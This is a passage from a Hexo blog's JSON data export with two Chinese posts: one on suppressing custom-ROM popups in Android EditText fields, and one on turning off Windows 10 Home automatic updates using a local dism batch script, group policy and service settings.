updateCursorPosition() {\n        loadCursorDrawable();\n        if (mDrawableForCursor == null) {\n            return;\n        }\n        // ...\n    }\n```\n那么上述“常用邮箱”之类的弹窗其实也类似。\n","slug":"避免Android定制ROM中的EditText出现pop弹窗","published":1,"updated":"2024-03-25T07:31:25.858Z","comments":1,"photos":[],"link":"","_id":"cluaufh0t001sthe6hnopboam","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>可能看到标题的同学一头雾水，这是什么东西，其实类似于你长按文本时出现的复制粘贴pop弹窗。在一些定制ROM中，厂商为了某些方便用户的特殊功能会增加文本输入检测和自定义弹窗，举例：<br><img src=\"https://imgconvert.csdnimg.cn/20191207163617238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>比如在你输入一些邮箱时，会自动弹出这种pop（并不需要你长按），且这个并非系统应用才有的，而是直接影响了所有EditText。<br>对于一些高度定制化UI的应用来说，这个可能影响用户体验。下面给出两种解决办法（都不算特别完美，毕竟卑微的应用层开发者改不了底层实现），大家酌情参考。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p><strong>方法一：</strong><br>要解决问题先思考（合理猜测）一下它的实现原理，很显然它修改了EditText或者TextView源码，在文本输入监听中加入了对邮箱特征的检测，我们可以尝试修改getText方法的返回值，过滤这种特征：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在自定义的EditText中重写getText</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Editable <span class=\"title function_\">getText</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">text</span> <span class=\"operator\">=</span> <span class=\"built_in\">super</span>.getText() != <span class=\"literal\">null</span> ? <span class=\"built_in\">super</span>.getText().toString() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (text != <span class=\"literal\">null</span> &amp;&amp; text.contains(<span class=\"string\">&quot;@&quot;</span>)) &#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// 如果输入内容包含@符号，则删掉再返回</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> Editable.Factory.getInstance().newEditable(text.replaceAll(<span class=\"string\">&quot;@&quot;</span>, <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.getText();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当然有同学会说，上述办法也影响了getText方法返回内容的正确性，没关系，我们反正是自定义控件，再补一个方法即可，业务代码外部调用就调这个：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Editable <span class=\"title function_\">getRealText</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.getText();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>方法二：</strong><br>这个方法适合不需要自定义EditText游标的同学，非常简单，给EditText的xml代码加上 <code>android:textCursorDrawable=&quot;@null&quot;</code> 属性即可。<br>有人会觉得奇怪，这个cursor的drawable跟pop弹窗有啥关系，因为原生的复制粘贴pop弹窗在显示之前要计算游标（Cursor）的位置，且会检查 <code>mDrawableForCursor</code> 是否存在，如果不存在就不走后续逻辑了，具体可以参看Editor源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">updateCursorPosition</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    loadCursorDrawable();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mDrawableForCursor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么上述“常用邮箱”之类的弹窗其实也类似。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>可能看到标题的同学一头雾水，这是什么东西，其实类似于你长按文本时出现的复制粘贴pop弹窗。在一些定制ROM中，厂商为了某些方便用户的特殊功能会增加文本输入检测和自定义弹窗，举例：<br><img src=\"https://imgconvert.csdnimg.cn/20191207163617238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>比如在你输入一些邮箱时，会自动弹出这种pop（并不需要你长按），且这个并非系统应用才有的，而是直接影响了所有EditText。<br>对于一些高度定制化UI的应用来说，这个可能影响用户体验。下面给出两种解决办法（都不算特别完美，毕竟卑微的应用层开发者改不了底层实现），大家酌情参考。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p><strong>方法一：</strong><br>要解决问题先思考（合理猜测）一下它的实现原理，很显然它修改了EditText或者TextView源码，在文本输入监听中加入了对邮箱特征的检测，我们可以尝试修改getText方法的返回值，过滤这种特征：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在自定义的EditText中重写getText</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Editable <span class=\"title function_\">getText</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">text</span> <span class=\"operator\">=</span> <span class=\"built_in\">super</span>.getText() != <span class=\"literal\">null</span> ? <span class=\"built_in\">super</span>.getText().toString() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (text != <span class=\"literal\">null</span> &amp;&amp; text.contains(<span class=\"string\">&quot;@&quot;</span>)) &#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// 如果输入内容包含@符号，则删掉再返回</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> Editable.Factory.getInstance().newEditable(text.replaceAll(<span class=\"string\">&quot;@&quot;</span>, <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.getText();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当然有同学会说，上述办法也影响了getText方法返回内容的正确性，没关系，我们反正是自定义控件，再补一个方法即可，业务代码外部调用就调这个：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Editable <span class=\"title function_\">getRealText</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.getText();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>方法二：</strong><br>这个方法适合不需要自定义EditText游标的同学，非常简单，给EditText的xml代码加上 <code>android:textCursorDrawable=&quot;@null&quot;</code> 属性即可。<br>有人会觉得奇怪，这个cursor的drawable跟pop弹窗有啥关系，因为原生的复制粘贴pop弹窗在显示之前要计算游标（Cursor）的位置，且会检查 <code>mDrawableForCursor</code> 是否存在，如果不存在就不走后续逻辑了，具体可以参看Editor源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">updateCursorPosition</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    loadCursorDrawable();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mDrawableForCursor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么上述“常用邮箱”之类的弹窗其实也类似。</p>\n"},{"layout":"post","title":"Win10家庭版如何正确关闭自动更新","subtitle":"专治各种小毛病。","date":"2019-12-13T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 之所以不更新，是因为你太好用，舍不得你出问题。哈哈哈哈哈哈啊哈哈哈！\n\n### 背景\nWindows10还是很漂亮很好用的，大部分同学购买的品牌机也都会预装正版Win10，不过是家庭版的（个人用户一般也不需要专业版，比如我这种装双系统的只把Win10拿来打游戏），然而，家庭版系统要用常规手段是没法彻底关闭自动更新的。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly90aW1nc2EuYmFpZHUuY29tL3RpbWc_aW1hZ2UmcXVhbGl0eT04MCZzaXplPWI5OTk5XzEwMDAwJnNlYz0xNTc2MzM0NzM1ODAxJmRpPTdhNTA2OWZiZGEyZWIzZjE0YzZkZGZlY2QxZDVkNzliJmltZ3R5cGU9MCZzcmM9aHR0cDovL3d3dy5wYy1mbHkuY29tL3VwbG9hZHMvYWxsaW1nLzE2MDYwNy8wWjMxMU0wM18xLmpwZw?x-oss-process=image/format,png)\n微软也非常不给面子，各种给你悄悄打开，当你关机时，你会吃惊地发现“更新并关机”这个选项。\n下面就介绍一下正确关闭自动更新的方法。\n\n### 解决\n##### 找回家庭版的组策略\n换新电脑以前我也是用的专业版，从来没有自动更新过，印象中就是在设置了组策略后生效的。但众所周知，组策略在家庭版上默认是打不开的，当然这并不代表功能缺失，而是隐藏了。\n**如何找回？**\n1、打开Windows的记事本，输入内容如下：\n\n```\n@echo off\npushd \"%~dp0\"\ndir /b %systemroot%\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum >gp.txt\ndir /b  %systemroot%\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum >>gp.txt\nfor /f %%i in ('findstr /i . gp.txt 2^>nul') do dism /online /norestart /add-package:\"%systemroot%\\servicing\\Packages\\%%i\"\npause\n```\n2、另存为xxx.bat文件，且编码要改成ANSI：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214200221376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3、然后右键“以管理员身份运行”此脚本文件，等待片刻（**脚本说明：通过dir命令遍历系统盘servicing目录，寻找组策略的配置包，找到后写入到gp.txt文件，然后通过dism命令来安装组策略包**）。\n4、开始菜单右键，点击“运行”，输入 `gpedit.msc` ，会发现，我们的组策略可以打开啦！\n5、在组策略中找到“**配置自动更新**”，双击后将其禁用，顺便可以把“**自动更新检测频率**”也禁用掉：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214200612183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n6、完事！成功关闭后，自动更新就会提示失败：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201353940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 传统方法\n如果进行上述操作后还是有不放心的同学，可以再按以前的传统方法设置一遍，毕竟多重保障嘛！\n##### 关闭系统更新服务\n1、开始菜单右键运行，输入 `services.msc` 进入服务，找到**Windows Update**，将其禁用：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201124416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n2、然后，切换到“恢复”选项卡，都设为“无操作”：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201211600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3、再然后，在系统设置的**更新和安全**中，找到Windows更新的高级选项，全都关了：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201452659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2019121420154740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n##### 在WLAN中打开按流量计费\n你看微软多体贴啊，如果你告诉它你在用流量上网，它就不会更新了。\n1、在网络连接中打开**属性**：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201845246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n2、找到流量计费开关，把它打开：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2019121420193537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n无需担心，这个开关只是你对系统的宣告，并不是真的就变成流量计费了。\n\n### 参考\n[https://www.zhihu.com/question/41745930/answer/510335896](https://www.zhihu.com/question/41745930/answer/510335896)\n","source":"_posts/2019-12-14-Win10家庭版如何正确关闭自动更新.md","raw":"---\nlayout:     post\ntitle:      Win10家庭版如何正确关闭自动更新\nsubtitle:   专治各种小毛病。\ndate:       2019-12-14\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Windows\n---\n\n> 之所以不更新，是因为你太好用，舍不得你出问题。哈哈哈哈哈哈啊哈哈哈！\n\n### 背景\nWindows10还是很漂亮很好用的，大部分同学购买的品牌机也都会预装正版Win10，不过是家庭版的（个人用户一般也不需要专业版，比如我这种装双系统的只把Win10拿来打游戏），然而，家庭版系统要用常规手段是没法彻底关闭自动更新的。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly90aW1nc2EuYmFpZHUuY29tL3RpbWc_aW1hZ2UmcXVhbGl0eT04MCZzaXplPWI5OTk5XzEwMDAwJnNlYz0xNTc2MzM0NzM1ODAxJmRpPTdhNTA2OWZiZGEyZWIzZjE0YzZkZGZlY2QxZDVkNzliJmltZ3R5cGU9MCZzcmM9aHR0cDovL3d3dy5wYy1mbHkuY29tL3VwbG9hZHMvYWxsaW1nLzE2MDYwNy8wWjMxMU0wM18xLmpwZw?x-oss-process=image/format,png)\n微软也非常不给面子，各种给你悄悄打开，当你关机时，你会吃惊地发现“更新并关机”这个选项。\n下面就介绍一下正确关闭自动更新的方法。\n\n### 解决\n##### 找回家庭版的组策略\n换新电脑以前我也是用的专业版，从来没有自动更新过，印象中就是在设置了组策略后生效的。但众所周知，组策略在家庭版上默认是打不开的，当然这并不代表功能缺失，而是隐藏了。\n**如何找回？**\n1、打开Windows的记事本，输入内容如下：\n\n```\n@echo off\npushd \"%~dp0\"\ndir /b %systemroot%\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum >gp.txt\ndir /b  %systemroot%\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum >>gp.txt\nfor /f %%i in ('findstr /i . gp.txt 2^>nul') do dism /online /norestart /add-package:\"%systemroot%\\servicing\\Packages\\%%i\"\npause\n```\n2、另存为xxx.bat文件，且编码要改成ANSI：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214200221376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3、然后右键“以管理员身份运行”此脚本文件，等待片刻（**脚本说明：通过dir命令遍历系统盘servicing目录，寻找组策略的配置包，找到后写入到gp.txt文件，然后通过dism命令来安装组策略包**）。\n4、开始菜单右键，点击“运行”，输入 `gpedit.msc` ，会发现，我们的组策略可以打开啦！\n5、在组策略中找到“**配置自动更新**”，双击后将其禁用，顺便可以把“**自动更新检测频率**”也禁用掉：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214200612183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n6、完事！成功关闭后，自动更新就会提示失败：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201353940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n### 传统方法\n如果进行上述操作后还是有不放心的同学，可以再按以前的传统方法设置一遍，毕竟多重保障嘛！\n##### 关闭系统更新服务\n1、开始菜单右键运行，输入 `services.msc` 进入服务，找到**Windows Update**，将其禁用：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201124416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n2、然后，切换到“恢复”选项卡，都设为“无操作”：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201211600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3、再然后，在系统设置的**更新和安全**中，找到Windows更新的高级选项，全都关了：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201452659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2019121420154740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n##### 在WLAN中打开按流量计费\n你看微软多体贴啊，如果你告诉它你在用流量上网，它就不会更新了。\n1、在网络连接中打开**属性**：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191214201845246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n2、找到流量计费开关，把它打开：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2019121420193537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n无需担心，这个开关只是你对系统的宣告，并不是真的就变成流量计费了。\n\n### 参考\n[https://www.zhihu.com/question/41745930/answer/510335896](https://www.zhihu.com/question/41745930/answer/510335896)\n","slug":"Win10家庭版如何正确关闭自动更新","published":1,"updated":"2024-03-25T07:31:25.858Z","comments":1,"photos":[],"link":"","_id":"cluaufh0u001uthe6btthd9v7","content":"<blockquote>\n<p>之所以不更新，是因为你太好用，舍不得你出问题。哈哈哈哈哈哈啊哈哈哈！</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>Windows10还是很漂亮很好用的，大部分同学购买的品牌机也都会预装正版Win10，不过是家庭版的（个人用户一般也不需要专业版，比如我这种装双系统的只把Win10拿来打游戏），然而，家庭版系统要用常规手段是没法彻底关闭自动更新的。<br><img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly90aW1nc2EuYmFpZHUuY29tL3RpbWc_aW1hZ2UmcXVhbGl0eT04MCZzaXplPWI5OTk5XzEwMDAwJnNlYz0xNTc2MzM0NzM1ODAxJmRpPTdhNTA2OWZiZGEyZWIzZjE0YzZkZGZlY2QxZDVkNzliJmltZ3R5cGU9MCZzcmM9aHR0cDovL3d3dy5wYy1mbHkuY29tL3VwbG9hZHMvYWxsaW1nLzE2MDYwNy8wWjMxMU0wM18xLmpwZw?x-oss-process=image/format,png\" alt=\"在这里插入图片描述\"><br>微软也非常不给面子，各种给你悄悄打开，当你关机时，你会吃惊地发现“更新并关机”这个选项。<br>下面就介绍一下正确关闭自动更新的方法。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><h5 id=\"找回家庭版的组策略\"><a href=\"#找回家庭版的组策略\" class=\"headerlink\" title=\"找回家庭版的组策略\"></a>找回家庭版的组策略</h5><p>换新电脑以前我也是用的专业版，从来没有自动更新过，印象中就是在设置了组策略后生效的。但众所周知，组策略在家庭版上默认是打不开的，当然这并不代表功能缺失，而是隐藏了。<br><strong>如何找回？</strong><br>1、打开Windows的记事本，输入内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@echo off</span><br><span class=\"line\">pushd &quot;%~dp0&quot;</span><br><span class=\"line\">dir /b %systemroot%\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;gp.txt</span><br><span class=\"line\">dir /b  %systemroot%\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;gp.txt</span><br><span class=\"line\">for /f %%i in (&#x27;findstr /i . gp.txt 2^&gt;nul&#x27;) do dism /online /norestart /add-package:&quot;%systemroot%\\servicing\\Packages\\%%i&quot;</span><br><span class=\"line\">pause</span><br></pre></td></tr></table></figure>\n<p>2、另存为xxx.bat文件，且编码要改成ANSI：<br><img src=\"https://imgconvert.csdnimg.cn/20191214200221376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>3、然后右键“以管理员身份运行”此脚本文件，等待片刻（<strong>脚本说明：通过dir命令遍历系统盘servicing目录，寻找组策略的配置包，找到后写入到gp.txt文件，然后通过dism命令来安装组策略包</strong>）。<br>4、开始菜单右键，点击“运行”，输入 <code>gpedit.msc</code> ，会发现，我们的组策略可以打开啦！<br>5、在组策略中找到“<strong>配置自动更新</strong>”，双击后将其禁用，顺便可以把“<strong>自动更新检测频率</strong>”也禁用掉：<br><img src=\"https://imgconvert.csdnimg.cn/20191214200612183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>6、完事！成功关闭后，自动更新就会提示失败：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201353940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"传统方法\"><a href=\"#传统方法\" class=\"headerlink\" title=\"传统方法\"></a>传统方法</h3><p>如果进行上述操作后还是有不放心的同学，可以再按以前的传统方法设置一遍，毕竟多重保障嘛！</p>\n<h5 id=\"关闭系统更新服务\"><a href=\"#关闭系统更新服务\" class=\"headerlink\" title=\"关闭系统更新服务\"></a>关闭系统更新服务</h5><p>1、开始菜单右键运行，输入 <code>services.msc</code> 进入服务，找到<strong>Windows Update</strong>，将其禁用：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201124416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、然后，切换到“恢复”选项卡，都设为“无操作”：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201211600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>3、再然后，在系统设置的<strong>更新和安全</strong>中，找到Windows更新的高级选项，全都关了：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201452659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/2019121420154740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"在WLAN中打开按流量计费\"><a href=\"#在WLAN中打开按流量计费\" class=\"headerlink\" title=\"在WLAN中打开按流量计费\"></a>在WLAN中打开按流量计费</h5><p>你看微软多体贴啊，如果你告诉它你在用流量上网，它就不会更新了。<br>1、在网络连接中打开<strong>属性</strong>：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201845246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、找到流量计费开关，把它打开：<br><img src=\"https://imgconvert.csdnimg.cn/2019121420193537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>无需担心，这个开关只是你对系统的宣告，并不是真的就变成流量计费了。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.zhihu.com/question/41745930/answer/510335896\">https://www.zhihu.com/question/41745930/answer/510335896</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas 